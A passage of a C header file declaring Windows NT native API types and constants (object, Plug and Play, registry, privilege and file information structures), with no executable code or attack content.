} OBJECT_INFORMATION_CLASS;

typedef struct _OBJECT_BASIC_INFORMATION {
	ULONG Attributes;
	ACCESS_MASK GrantedAccess;
	ULONG HandleCount;
	ULONG PointerCount;
	ULONG PagedPoolCharge;
	ULONG NonPagedPoolCharge;
	ULONG Reserved[ 3 ];
	ULONG NameInfoSize;
	ULONG TypeInfoSize;
	ULONG SecurityDescriptorSize;
	LARGE_INTEGER CreationTime;
} OBJECT_BASIC_INFORMATION, *POBJECT_BASIC_INFORMATION;

typedef struct _OBJECT_NAME_INFORMATION {
	UNICODE_STRING Name;
} OBJECT_NAME_INFORMATION, *POBJECT_NAME_INFORMATION;

typedef struct _OBJECT_TYPE_INFORMATION
{
	UNICODE_STRING TypeName;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccessMask;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	ULONG PoolType;
	ULONG DefaultPagedPoolCharge;
	ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;

typedef struct _OBJECT_TYPES_INFORMATION
{
	ULONG NumberOfTypes;
	OBJECT_TYPE_INFORMATION TypeInformation;
} OBJECT_TYPES_INFORMATION, *POBJECT_TYPES_INFORMATION;

typedef struct _OBJECT_HANDLE_FLAG_INFORMATION
{
	BOOLEAN Inherit;
	BOOLEAN ProtectFromClose;
} OBJECT_HANDLE_FLAG_INFORMATION, *POBJECT_HANDLE_FLAG_INFORMATION;

typedef enum _PLUGPLAY_EVENT_CATEGORY {
	HardwareProfileChangeEvent,
	TargetDeviceChangeEvent,
	DeviceClassChangeEvent,
	CustomDeviceEvent,
	DeviceInstallEvent,
	DeviceArrivalEvent,
	PowerEvent,
	VetoEvent,
	BlockedDriverEvent,
	InvalidIDEvent,
	MaxPlugEventCategory
} PLUGPLAY_EVENT_CATEGORY, *PPLUGPLAY_EVENT_CATEGORY;

typedef enum _PNP_VETO_TYPE {
	PNP_VetoTypeUnknown,            // Name is unspecified
	PNP_VetoLegacyDevice,           // Name is an Instance Path
	PNP_VetoPendingClose,           // Name is an Instance Path
	PNP_VetoWindowsApp,             // Name is a Module
	PNP_VetoWindowsService,         // Name is a Service
	PNP_VetoOutstandingOpen,        // Name is an Instance Path
	PNP_VetoDevice,                 // Name is an Instance Path
	PNP_VetoDriver,                 // Name is a Driver Service Name
	PNP_VetoIllegalDeviceRequest,   // Name is an Instance Path
	PNP_VetoInsufficientPower,      // Name is unspecified
	PNP_VetoNonDisableable,         // Name is an Instance Path
	PNP_VetoLegacyDriver,           // Name is a Service
	PNP_VetoInsufficientRights      // Name is unspecified
}   PNP_VETO_TYPE, *PPNP_VETO_TYPE;

typedef struct _PLUGPLAY_EVENT_BLOCK {
	//
	// Common event data
	//
	GUID EventGuid;
	PLUGPLAY_EVENT_CATEGORY EventCategory;
	PULONG Result;
	ULONG Flags;
	ULONG TotalSize;
	PVOID DeviceObject;

	union {

		struct {
			GUID ClassGuid;
			WCHAR SymbolicLinkName[1];
		} DeviceClass;

		struct {
			WCHAR DeviceIds[1];
		} TargetDevice;

		struct {
			WCHAR DeviceId[1];
		} InstallDevice;

		struct {
			PVOID NotificationStructure;
			WCHAR DeviceIds[1];
		} CustomNotification;

		struct {
			PVOID Notification;
		} ProfileNotification;

		struct {
			ULONG NotificationCode;
			ULONG NotificationData;
		} PowerNotification;

		struct {
			PNP_VETO_TYPE VetoType;
			WCHAR DeviceIdVetoNameBuffer[1]; // DeviceId<NULL>VetoName<NULL><NULL>
		} VetoNotification;

		struct {
			GUID BlockedDriverGuid;
		} BlockedDriverNotification;

		struct {
			WCHAR ParentId[1];
		} InvalidIDNotification;

	} u;

} PLUGPLAY_EVENT_BLOCK, *PPLUGPLAY_EVENT_BLOCK;

typedef LARGE_INTEGER PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;

#define MDL_HASH_TABLE_SIZE 64
#define MDL_HASH_MASK	(MDL_HASH_TABLE_SIZE-1)
#define MDL_HASH_INDEX(wch) ((RtlUpcaseUnicodeChar((wch)) - (WCHAR)'A') & MDL_HASH_MASK)

#if !defined(_WINNT_)
#define HEAP_MAKE_TAG_FLAGS( b, o ) ((ULONG)((b) + ((o) << 18)))
#endif
#define RTL_HEAP_MAKE_TAG HEAP_MAKE_TAG_FLAGS

typedef struct _TIME_FIELDS {
	CSHORT Year;        // range [1601...]
	CSHORT Month;       // range [1..12]
	CSHORT Day;         // range [1..31]
	CSHORT Hour;        // range [0..23]
	CSHORT Minute;      // range [0..59]
	CSHORT Second;      // range [0..59]
	CSHORT Milliseconds;// range [0..999]
	CSHORT Weekday;     // range [0..6] == [Sunday..Saturday]
} TIME_FIELDS;
typedef TIME_FIELDS *PTIME_FIELDS;

typedef struct _RTL_TIME_ZONE_INFORMATION {
	LONG Bias;
	WCHAR StandardName[ 32 ];
	TIME_FIELDS StandardStart;
	LONG StandardBias;
	WCHAR DaylightName[ 32 ];
	TIME_FIELDS DaylightStart;
	LONG DaylightBias;
} RTL_TIME_ZONE_INFORMATION, *PRTL_TIME_ZONE_INFORMATION;

typedef struct _RTL_BITMAP_RUN {
	ULONG StartingIndex;
	ULONG NumberOfBits;
} RTL_BITMAP_RUN;
typedef RTL_BITMAP_RUN *PRTL_BITMAP_RUN;

typedef struct _PARSE_MESSAGE_CONTEXT {
	ULONG fFlags;
	ULONG cwSavColumn;
	SIZE_T iwSrc;
	SIZE_T iwDst;
	SIZE_T iwDstSpace;
	va_list lpvArgStart;
} PARSE_MESSAGE_CONTEXT, *PPARSE_MESSAGE_CONTEXT;

typedef enum _RTL_RXACT_OPERATION {
	RtlRXactOperationDelete = 1,        // Causes sub-key to be deleted
	RtlRXactOperationSetValue,          // Sets sub-key value (creates key(s) if necessary)
	RtlRXactOperationDelAttribute,
	RtlRXactOperationSetAttribute
} RTL_RXACT_OPERATION, *PRTL_RXACT_OPERATION;

typedef struct _RTL_RXACT_LOG {
	ULONG OperationCount;
	ULONG LogSize;
	ULONG LogSizeInUse;
#if defined(_M_X64)
	ULONG Alignment;
#endif
} RTL_RXACT_LOG, *PRTL_RXACT_LOG;

typedef struct _RTL_RXACT_CONTEXT {
	HANDLE RootRegistryKey;
	HANDLE RXactKey;
	BOOLEAN HandlesValid;
	PRTL_RXACT_LOG RXactLog;
} RTL_RXACT_CONTEXT, *PRTL_RXACT_CONTEXT;

#define MAXIMUM_LEADBYTES   12

typedef struct _CPTABLEINFO {
	USHORT CodePage;                    // code page number
	USHORT MaximumCharacterSize;        // max length (bytes) of a char
	USHORT DefaultChar;                 // default character (MB)
	USHORT UniDefaultChar;              // default character (Unicode)
	USHORT TransDefaultChar;            // translation of default char (Unicode)
	USHORT TransUniDefaultChar;         // translation of Unic default char (MB)
	USHORT DBCSCodePage;                // Non 0 for DBCS code pages
	UCHAR  LeadByte[MAXIMUM_LEADBYTES]; // lead byte ranges
	PUSHORT MultiByteTable;             // pointer to MB translation table
	PVOID   WideCharTable;              // pointer to WC translation table
	PUSHORT DBCSRanges;                 // pointer to DBCS ranges
	PUSHORT DBCSOffsets;                // pointer to DBCS offsets
} CPTABLEINFO, *PCPTABLEINFO;

typedef struct _NLSTABLEINFO {
	CPTABLEINFO OemTableInfo;
	CPTABLEINFO AnsiTableInfo;
	PUSHORT UpperCaseTable;             // 844 format upcase table
	PUSHORT LowerCaseTable;             // 844 format lower case table
} NLSTABLEINFO, *PNLSTABLEINFO;

#define RTL_RANGE_LIST_SHARED_OK           0x00000001
#define RTL_RANGE_LIST_NULL_CONFLICT_OK    0x00000002

typedef struct _RTL_RANGE {
	ULONGLONG Start;    // Read only
	ULONGLONG End;      // Read only
	PVOID UserData;     // Read/Write
	PVOID Owner;        // Read/Write
	UCHAR Attributes;    // Read/Write
	UCHAR Flags;       // Read only
} RTL_RANGE, *PRTL_RANGE;

typedef
	BOOLEAN
	(*PRTL_CONFLICT_RANGE_CALLBACK) (
	IN PVOID Context,
	IN PRTL_RANGE Range
	);

typedef enum _EVENT_INFORMATION_CLASS {
	EventBasicInformation
} EVENT_INFORMATION_CLASS;


typedef enum _PLUGPLAY_CONTROL_CLASS {
	PlugPlayControlEnumerateDevice,
	PlugPlayControlRegisterNewDevice,
	PlugPlayControlDeregisterDevice,
	PlugPlayControlInitializeDevice,
	PlugPlayControlStartDevice,
	PlugPlayControlUnlockDevice,
	PlugPlayControlQueryAndRemoveDevice,
	PlugPlayControlUserResponse,
	PlugPlayControlGenerateLegacyDevice,
	PlugPlayControlGetInterfaceDeviceList,
	PlugPlayControlProperty,
	PlugPlayControlDeviceClassAssociation,
	PlugPlayControlGetRelatedDevice,
	PlugPlayControlGetInterfaceDeviceAlias,
	PlugPlayControlDeviceStatus,
	PlugPlayControlGetDeviceDepth,
	PlugPlayControlQueryDeviceRelations,
	PlugPlayControlTargetDeviceRelation,
	PlugPlayControlQueryConflictList,
	PlugPlayControlRetrieveDock,
	PlugPlayControlResetDevice,
	PlugPlayControlHaltDevice,
	PlugPlayControlGetBlockedDriverList,
	MaxPlugPlayControl
} PLUGPLAY_CONTROL_CLASS, *PPLUGPLAY_CONTROL_CLASS;

typedef
VOID
(*PPS_APC_ROUTINE) (
    IN OPTIONAL PVOID ApcArgument1,
    IN OPTIONAL PVOID ApcArgument2,
    IN OPTIONAL PVOID ApcArgument3
    );

typedef enum _KEY_INFORMATION_CLASS {
	KeyBasicInformation,
	KeyNodeInformation,
	KeyFullInformation,
	KeyNameInformation,
	KeyCachedInformation,
	KeyFlagsInformation,
	MaxKeyInfoClass
} KEY_INFORMATION_CLASS;

typedef struct _KEY_BASIC_INFORMATION {
	LARGE_INTEGER LastWriteTime;
	ULONG TitleIndex;
	ULONG NameLength;
	WCHAR Name[1];
} KEY_BASIC_INFORMATION, *PKEY_BASIC_INFORMATION;

typedef enum _KEY_VALUE_INFORMATION_CLASS {
	KeyValueBasicInformation,
	KeyValueFullInformation,
	KeyValuePartialInformation,
	KeyValueFullInformationAlign64,
	KeyValuePartialInformationAlign64,
	MaxKeyValueInfoClass
} KEY_VALUE_INFORMATION_CLASS;

//
// Value entry query structures
// 14.09.11

typedef struct _KEY_VALUE_BASIC_INFORMATION {
    ULONG   TitleIndex;
    ULONG   Type;
    ULONG   NameLength;
    WCHAR   Name[1];            // Variable size
} KEY_VALUE_BASIC_INFORMATION, *PKEY_VALUE_BASIC_INFORMATION;

typedef struct _KEY_VALUE_FULL_INFORMATION {
    ULONG   TitleIndex;
    ULONG   Type;
    ULONG   DataOffset;
    ULONG   DataLength;
    ULONG   NameLength;
    WCHAR   Name[1];            // Variable size
//          Data[1];            // Variable size data not declared
} KEY_VALUE_FULL_INFORMATION, *PKEY_VALUE_FULL_INFORMATION;

typedef struct _KEY_VALUE_PARTIAL_INFORMATION {
    ULONG   TitleIndex;
    ULONG   Type;
    ULONG   DataLength;
    UCHAR   Data[1];            // Variable size
} KEY_VALUE_PARTIAL_INFORMATION, *PKEY_VALUE_PARTIAL_INFORMATION;

typedef struct _KEY_VALUE_PARTIAL_INFORMATION_ALIGN64 {
    ULONG   Type;
    ULONG   DataLength;
    UCHAR   Data[1];            // Variable size
} KEY_VALUE_PARTIAL_INFORMATION_ALIGN64, *PKEY_VALUE_PARTIAL_INFORMATION_ALIGN64;

typedef struct _KEY_VALUE_ENTRY {
    PUNICODE_STRING ValueName;
    ULONG           DataLength;
    ULONG           DataOffset;
    ULONG           Type;
} KEY_VALUE_ENTRY, *PKEY_VALUE_ENTRY;

//
// end of value info
//

typedef enum _KEY_SET_INFORMATION_CLASS {
	KeyWriteTimeInformation,
	KeyUserFlagsInformation,
	MaxKeySetInfoClass
} KEY_SET_INFORMATION_CLASS;

#define SE_CREATE_TOKEN_NAME								TEXT("SeCreateTokenPrivilege")
#define SE_ASSIGNPRIMARYTOKEN_NAME					TEXT("SeAssignPrimaryTokenPrivilege")
#define SE_LOCK_MEMORY_NAME									TEXT("SeLockMemoryPrivilege")
#define SE_INCREASE_QUOTA_NAME							TEXT("SeIncreaseQuotaPrivilege")
#define SE_UNSOLICITED_INPUT_NAME						TEXT("SeUnsolicitedInputPrivilege")
#define SE_MACHINE_ACCOUNT_NAME							TEXT("SeMachineAccountPrivilege")
#define SE_TCB_NAME													TEXT("SeTcbPrivilege")
#define SE_SECURITY_NAME										TEXT("SeSecurityPrivilege")
#define SE_TAKE_OWNERSHIP_NAME							TEXT("SeTakeOwnershipPrivilege")
#define SE_LOAD_DRIVER_NAME									TEXT("SeLoadDriverPrivilege")
#define SE_SYSTEM_PROFILE_NAME							TEXT("SeSystemProfilePrivilege")
#define SE_SYSTEMTIME_NAME									TEXT("SeSystemtimePrivilege")
#define SE_PROF_SINGLE_PROCESS_NAME					TEXT("SeProfileSingleProcessPrivilege")
#define SE_INC_BASE_PRIORITY_NAME						TEXT("SeIncreaseBasePriorityPrivilege")
#define SE_CREATE_PAGEFILE_NAME							TEXT("SeCreatePagefilePrivilege")
#define SE_CREATE_PERMANENT_NAME						TEXT("SeCreatePermanentPrivilege")
#define SE_BACKUP_NAME											TEXT("SeBackupPrivilege")
#define SE_RESTORE_NAME											TEXT("SeRestorePrivilege")
#define SE_SHUTDOWN_NAME										TEXT("SeShutdownPrivilege")
#define SE_DEBUG_NAME												TEXT("SeDebugPrivilege")
#define SE_AUDIT_NAME												TEXT("SeAuditPrivilege")
#define SE_SYSTEM_ENVIRONMENT_NAME					TEXT("SeSystemEnvironmentPrivilege")
#define SE_CHANGE_NOTIFY_NAME								TEXT("SeChangeNotifyPrivilege")
#define SE_REMOTE_SHUTDOWN_NAME							TEXT("SeRemoteShutdownPrivilege")
#define SE_UNDOCK_NAME											TEXT("SeUndockPrivilege")
#define SE_SYNC_AGENT_NAME									TEXT("SeSyncAgentPrivilege")
#define SE_ENABLE_DELEGATION_NAME						TEXT("SeEnableDelegationPrivilege")
#define SE_MANAGE_VOLUME_NAME								TEXT("SeManageVolumePrivilege")
#define SE_IMPERSONATE_NAME									TEXT("SeImpersonatePrivilege")
// #define SE_CREATE_GLOBAL_PRIVILEGE					TEXT("SeCreateGlobalPrivilege")
// #define SE_TRUSTED_CREDMAN_ACCESS_PRIVILEGE	TEXT("SeTrustedCredmanAccessPrivilege")
// #define SE_RELABEL_PRIVILEGE								TEXT("SeReLabelPrivilege")
#define SE_CREATE_GLOBAL_NAME								TEXT("SeCreateGlobalPrivilege")

// Privileges

#define SE_MIN_WELL_KNOWN_PRIVILEGE (2L)
#define SE_CREATE_TOKEN_PRIVILEGE (2L)
#define SE_ASSIGNPRIMARYTOKEN_PRIVILEGE (3L)
#define SE_LOCK_MEMORY_PRIVILEGE (4L)
#define SE_INCREASE_QUOTA_PRIVILEGE (5L)

#define SE_MACHINE_ACCOUNT_PRIVILEGE (6L)
#define SE_TCB_PRIVILEGE (7L)
#define SE_SECURITY_PRIVILEGE (8L)
#define SE_TAKE_OWNERSHIP_PRIVILEGE (9L)
#define SE_LOAD_DRIVER_PRIVILEGE (10L)
#define SE_SYSTEM_PROFILE_PRIVILEGE (11L)
#define SE_SYSTEMTIME_PRIVILEGE (12L)
#define SE_PROF_SINGLE_PROCESS_PRIVILEGE (13L)
#define SE_INC_BASE_PRIORITY_PRIVILEGE (14L)
#define SE_CREATE_PAGEFILE_PRIVILEGE (15L)
#define SE_CREATE_PERMANENT_PRIVILEGE (16L)
#define SE_BACKUP_PRIVILEGE (17L)
#define SE_RESTORE_PRIVILEGE (18L)
#define SE_SHUTDOWN_PRIVILEGE (19L)
#define SE_DEBUG_PRIVILEGE (20L)
#define SE_AUDIT_PRIVILEGE (21L)
#define SE_SYSTEM_ENVIRONMENT_PRIVILEGE (22L)
#define SE_CHANGE_NOTIFY_PRIVILEGE (23L)
#define SE_REMOTE_SHUTDOWN_PRIVILEGE (24L)
#define SE_UNDOCK_PRIVILEGE (25L)
#define SE_SYNC_AGENT_PRIVILEGE (26L)
#define SE_ENABLE_DELEGATION_PRIVILEGE (27L)
#define SE_MANAGE_VOLUME_PRIVILEGE (28L)
#define SE_IMPERSONATE_PRIVILEGE (29L)
#define SE_CREATE_GLOBAL_PRIVILEGE (30L)
#define SE_TRUSTED_CREDMAN_ACCESS_PRIVILEGE (31L)
#define SE_RELABEL_PRIVILEGE (32L)
#define SE_INC_WORKING_SET_PRIVILEGE (33L)
#define SE_TIME_ZONE_PRIVILEGE (34L)
#define SE_CREATE_SYMBOLIC_LINK_PRIVILEGE (35L)
#define SE_MAX_WELL_KNOWN_PRIVILEGE SE_CREATE_SYMBOLIC_LINK_PRIVILEGE

typedef struct _CLIENT_ID
{
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _CLIENT_ID32
{
	ULONG UniqueProcess;
	ULONG UniqueThread;
} CLIENT_ID32, *PCLIENT_ID32;

typedef struct _CLIENT_ID64
{
	ULONGLONG UniqueProcess;
	ULONGLONG UniqueThread;
} CLIENT_ID64, *PCLIENT_ID64;

#include <pshpack4.h>

typedef struct _KSYSTEM_TIME
{
	ULONG LowPart;
	LONG High1Time;
	LONG High2Time;
} KSYSTEM_TIME, *PKSYSTEM_TIME;

#include <poppack.h>

//
// FILE_INFORMATION
//
//readded 17.09.11 EP_X0FF

typedef struct _FILE_BASIC_INFORMATION {                    // ntddk wdm nthal
	LARGE_INTEGER CreationTime;                             // ntddk wdm nthal
	LARGE_INTEGER LastAccessTime;                           // ntddk wdm nthal
	LARGE_INTEGER LastWriteTime;                            // ntddk wdm nthal
	LARGE_INTEGER ChangeTime;                               // ntddk wdm nthal
	ULONG FileAttributes;                                   // ntddk wdm nthal
} FILE_BASIC_INFORMATION, *PFILE_BASIC_INFORMATION;         // ntddk wdm nthal

typedef struct _FILE_STANDARD_INFORMATION
{
	LARGE_INTEGER AllocationSize;
	LARGE_INTEGER EndOfFile;
	ULONG NumberOfLinks;
	UCHAR DeletePending;
	UCHAR Directory;
} FILE_STANDARD_INFORMATION;

typedef struct _FILE_INTERNAL_INFORMATION {
    LARGE_INTEGER IndexNumber;
} FILE_INTERNAL_INFORMATION, *PFILE_INTERNAL_INFORMATION;

typedef struct _FILE_EA_INFORMATION {
    ULONG EaSize;
} FILE_EA_INFORMATION, *PFILE_EA_INFORMATION;

typedef struct _FILE_ACCESS_INFORMATION {
    ACCESS_MASK AccessFlags;
} FILE_ACCESS_INFORMATION, *PFILE_ACCESS_INFORMATION;

typedef struct _FILE_POSITION_INFORMATION {                 // ntddk wdm nthal
    LARGE_INTEGER CurrentByteOffset;                        // ntddk wdm nthal
} FILE_POSITION_INFORMATION, *PFILE_POSITION_INFORMATION;   // ntddk wdm nthal
                                                            // ntddk wdm nthal
typedef struct _FILE_MODE_INFORMATION {
    ULONG Mode;
} FILE_MODE_INFORMATION, *PFILE_MODE_INFORMATION;

typedef struct _FILE_ALIGNMENT_INFORMATION {                // ntddk nthal
    ULONG AlignmentRequirement;                             // ntddk nthal
} FILE_ALIGNMENT_INFORMATION, *PFILE_ALIGNMENT_INFORMATION; // ntddk nthal
                                                            // ntddk nthal
typedef struct _FILE_NAME_INFORMATION {                     // ntddk
    ULONG FileNameLength;                                   // ntddk
    WCHAR FileName[1];                                      // ntddk
} FILE_NAME_INFORMATION, *PFILE_NAME_INFORMATION;           // ntddk

typedef struct _FILE_ALL_INFORMATION {
    FILE_BASIC_INFORMATION BasicInformation;
    FILE_STANDARD_INFORMATION StandardInformation;
    FILE_INTERNAL_INFORMATION InternalInformation;
    FILE_EA_INFORMATION EaInformation;
    FILE_ACCESS_INFORMATION AccessInformation;
    FILE_POSITION_INFORMATION PositionInformation;
    FILE_MODE_INFORMATION ModeInformation;
    FILE_ALIGNMENT_INFORMATION AlignmentInformation;
    FILE_NAME_INFORMATION NameInformation;
} FILE_ALL_INFORMATION, *PFILE_ALL_INFORMATION;

typedef struct _FILE_NETWORK_OPEN_INFORMATION {                 // ntddk wdm nthal
    LARGE_INTEGER CreationTime;                                 // ntddk wdm nthal
    LARGE_INTEGER LastAccessTime;                               // ntddk wdm nthal
    LARGE_INTEGER LastWriteTime;                                // ntddk wdm nthal
    LARGE_INTEGER ChangeTime;                                   // ntddk wdm nthal
    LARGE_INTEGER AllocationSize;                               // ntddk wdm nthal
    LARGE_INTEGER EndOfFile;                                    // ntddk wdm nthal
    ULONG FileAttributes;                                       // ntddk wdm nthal
} FILE_NETWORK_OPEN_INFORMATION, *PFILE_NETWORK_OPEN_INFORMATION;   // ntddk wdm nthal
                                                                // ntddk wdm nthal
typedef struct _FILE_ATTRIBUTE_TAG_INFORMATION {               // ntddk nthal
    ULONG FileAttributes;                                       // ntddk nthal
    ULONG ReparseTag;                                           // ntddk nthal
} FILE_ATTRIBUTE_TAG_INFORMATION, *PFILE_ATTRIBUTE_TAG_INFORMATION;  // ntddk nthal
                                                                // ntddk nthal
typedef struct _FILE_ALLOCATION_INFORMATION {
    LARGE_INTEGER AllocationSize;
} FILE_ALLOCATION_INFORMATION, *PFILE_ALLOCATION_INFORMATION;

typedef struct _FILE_COMPRESSION_INFORMATION {
    LARGE_INTEGER CompressedFileSize;
    USHORT CompressionFormat;
    UCHAR CompressionUnitShift;
    UCHAR ChunkShift;
    UCHAR ClusterShift;
    UCHAR Reserved[3];
} FILE_COMPRESSION_INFORMATION, *PFILE_COMPRESSION_INFORMATION;

typedef struct _FILE_DISPOSITION_INFORMATION {                  // ntddk nthal
    BOOLEAN DeleteFile;                                         // ntddk nthal
} FILE_DISPOSITION_INFORMATION, *PFILE_DISPOSITION_INFORMATION; // ntddk nthal
                                                                // ntddk nthal
typedef struct _FILE_END_OF_FILE_INFORMATION {                  // ntddk nthal
    LARGE_INTEGER EndOfFile;                                    // ntddk nthal
} FILE_END_OF_FILE_INFORMATION, *PFILE_END_OF_FILE_INFORMATION; // ntddk nthal
                                                                // ntddk nthal
typedef struct _FILE_VALID_DATA_LENGTH_INFORMATION {                                    // ntddk nthal
    LARGE_INTEGER ValidDataLength;                                                      // ntddk nthal
} FILE_VALID_DATA_LENGTH_INFORMATION, *PFILE_VALID_DATA_LENGTH_INFORMATION;             // ntddk nthal

typedef struct _FILE_LINK_INFORMATION {
    BOOLEAN ReplaceIfExists;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_LINK_INFORMATION, *PFILE_LINK_INFORMATION;

typedef struct _FILE_MOVE_CLUSTER_INFORMATION {
    ULONG ClusterCount;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_MOVE_CLUSTER_INFORMATION, *PFILE_MOVE_CLUSTER_INFORMATION;

typedef struct _FILE_RENAME_INFORMATION {
    BOOLEAN ReplaceIfExists;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_RENAME_INFORMATION, *PFILE_RENAME_INFORMATION;

typedef struct _FILE_STREAM_INFORMATION {
    ULONG NextEntryOffset;
    ULONG StreamNameLength;
    LARGE_INTEGER StreamSize;
    LARGE_INTEGER StreamAllocationSize;
    WCHAR StreamName[1];
} FILE_STREAM_INFORMATION, *PFILE_STREAM_INFORMATION;

typedef struct _FILE_TRACKING_INFORMATION {
    HANDLE DestinationFile;
    ULONG ObjectInformationLength;
    CHAR ObjectInformation[1];
} FILE_TRACKING_INFORMATION, *PFILE_TRACKING_INFORMATION;

typedef struct _FILE_COMPLETION_INFORMATION {
    HANDLE Port;
    PVOID Key;
} FILE_COMPLETION_INFORMATION, *PFILE_COMPLETION_INFORMATION;

typedef struct _FILE_PIPE_INFORMATION {
     ULONG ReadMode;
     ULONG CompletionMode;
} FILE_PIPE_INFORMATION, *PFILE_PIPE_INFORMATION;

typedef struct _FILE_PIPE_LOCAL_INFORMATION {
     ULONG NamedPipeType;
     ULONG NamedPipeConfiguration;
     ULONG MaximumInstances;
     ULONG CurrentInstances;
     ULONG InboundQuota;
     ULONG ReadDataAvailable;
     ULONG OutboundQuota;
     ULONG WriteQuotaAvailable;
     ULONG NamedPipeState;
     ULONG NamedPipeEnd;
} FILE_PIPE_LOCAL_INFORMATION, *PFILE_PIPE_LOCAL_INFORMATION;

typedef struct _FILE_PIPE_REMOTE_INFORMATION {
     LARGE_INTEGER CollectDataTime;
     ULONG MaximumCollectionCount;
} FILE_PIPE_REMOTE_INFORMATION, *PFILE_PIPE_REMOTE_INFORMATION;

typedef struct _FILE_MAILSLOT_QUERY_INFORMATION {
    ULONG MaximumMessageSize;
    ULONG MailslotQuota;
    ULONG NextMessageSize;
    ULONG MessagesAvailable;
    LARGE_INTEGER ReadTimeout;
} FILE_MAILSLOT_QUERY_INFORMATION, *PFILE_MAILSLOT_QUERY_INFORMATION;

typedef struct _FILE_MAILSLOT_SET_INFORMATION {
    PLARGE_INTEGER ReadTimeout;
} FILE_MAILSLOT_SET_INFORMATION, *PFILE_MAILSLOT_SET_INFORMATION;

typedef struct _FILE_REPARSE_POINT_INFORMATION {
    LONGLONG FileReference;
    ULONG Tag;
} FILE_REPARSE_POINT_INFORMATION, *PFILE_REPARSE_POINT_INFORMATION;

//
// NtQuery(Set)EaFile
//
// The offset for the start of EaValue is EaName[EaNameLength + 1]
//

// begin_ntddk begin_wdm

typedef struct _FILE_FULL_EA_INFORMATION {
    ULONG NextEntryOffset;
    UCHAR Flags;
    UCHAR EaNameLength;
    USHORT EaValueLength;
    CHAR EaName[1];
} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;

// end_ntddk end_wdm

typedef struct _FILE_GET_EA_INFORMATION {
    ULONG NextEntryOffset;
    UCHAR EaNameLength;
    CHAR EaName[1];
} FILE_GET_EA_INFORMATION, *PFILE_GET_EA_INFORMATION;

//
// NtQuery(Set)QuotaInformationFile
//

typedef struct _FILE_GET_QUOTA_INFORMATION {
    ULONG NextEntryOffset;
    ULONG SidLength;
    SID Sid;
} FILE_GET_QUOTA_INFORMATION, *PFILE_GET_QUOTA_INFORMATION;

typedef struct _FILE_QUOTA_INFORMATION {
    ULONG NextEntryOffset;
    ULONG SidLength;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER QuotaUsed;
    LARGE_INTEGER QuotaThreshold;
    LARGE_INTEGER QuotaLimit;
    SID Sid;
} FILE_QUOTA_INFORMATION, *PFILE_QUOTA_INFORMATION;

//
// NtQueryDirectoryFile return types:
//
//      FILE_DIRECTORY_INFORMATION
//      FILE_FULL_DIR_INFORMATION
//      FILE_ID_FULL_DIR_INFORMATION
//      FILE_BOTH_DIR_INFORMATION
//      FILE_ID_BOTH_DIR_INFORMATION
//      FILE_NAMES_INFORMATION
//      FILE_OBJECTID_INFORMATION
//

typedef struct _FILE_DIRECTORY_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;

typedef struct _FILE_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    WCHAR FileName[1];
} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;

typedef struct _FILE_ID_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_FULL_DIR_INFORMATION, *PFILE_ID_FULL_DIR_INFORMATION;

typedef struct _FILE_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
